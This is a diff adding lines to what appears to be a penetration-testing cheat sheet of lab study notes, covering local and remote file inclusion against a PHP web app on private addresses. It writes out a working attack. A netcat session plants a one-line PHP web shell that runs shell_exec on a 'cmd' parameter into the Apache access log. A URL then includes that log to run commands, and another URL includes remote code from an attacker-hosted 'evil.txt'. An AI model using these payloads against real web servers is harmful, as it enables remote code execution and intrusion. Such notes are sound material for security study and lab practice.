@@ -127,6 +127,31 @@ wget --header "User-Agent: Googlebot-Image" http://192.168.98.14/robots.txt
 
 ### Local File Inclusion
 
+#### Contaminating Log Files
+
+```
+kali@kali:~$ nc -nv 10.11.0.22 80
+(UNKNOWN) [10.11.0.22] 80 (http) open
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+
+HTTP/1.1 400 Bad Request
+```
+
+Now in the access file that string is present so:
+
+```
+http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
+```
+
+##### Apache logs Common location
+
+### Remote File Inclusion
+
+```
+http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
+```
+
+
 ## FTP
 Default Port: 21
 
